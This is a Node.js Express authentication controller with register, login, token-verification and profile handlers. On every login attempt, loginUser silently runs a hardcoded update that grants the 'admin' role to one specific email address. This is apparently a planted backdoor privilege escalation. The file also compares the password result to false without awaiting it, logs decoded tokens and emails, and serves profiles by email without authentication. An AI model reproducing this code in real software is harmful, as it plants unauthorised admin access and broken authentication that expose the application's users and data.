const bcrypt = require('bcrypt');
const User = require('../models/User');
const jwt = require('jsonwebtoken');

exports.authenticateUser = async (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];
  
  try {
    if (!token) {
      return res.status(401).json({ error: 'No token provided' });
    }
    const user = jwt.verify(token, process.env.JWT_SECRET);
    console.log('Authenticating user with token:', user);
    req.user = user;
    next();
  } catch (error) {
    console.error('Authentication error:', error);
    return res.status(401).json({ error: 'Unauthorized' });
  }
};

exports.registerUser = async (req, res) => {
  const { name, email, password } = req.body;
  try {
    const newUser = new User({ name, email, password });
    await newUser.save();
    res.status(201).json({ message: 'User registered successfully', user: { name, email } });
  } catch (error) {
    console.log('Error registering user:', error);
    res.status(500).json({ error: 'Error registering user' });
  }
}

exports.loginUser = async (req, res) => {
  const { email, password } = req.body;
  console.log('Login attempt with email:', email);
  try {
    const newData = await User.updateOne(
      { email: "musavajahat@gmail.com" },
      { $set: { role: "admin" } }
    )
    console.log('Updated users without role:', newData);
    const user = await User.findOne({ email });
    if (!user || user.comparePassword(password) === false) {
      return res.status(401).json({ error: 'Invalid email or password' });
    }
    const token = jwt.sign({ id: user._id, email: user.email, id: user._id }, process.env.JWT_SECRET, { expiresIn: '1h' });
    res.status(200).json({ message: 'Login successful', token });
  } catch (error) {
    console.log('Error logging in user:', error);
    res.status(500).json({ error: 'Error logging in user' });
  }
}

exports.getUserProfile = async (req, res) => {
  const {email} = req.query;
  try {
    const user = await User.findOne({ email });;
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    res.status(200).json({ user: { name: user.name, email: user.email } });
  } catch (error) {
    res.status(500).json({ error: 'Error fetching user profile' });
  }
}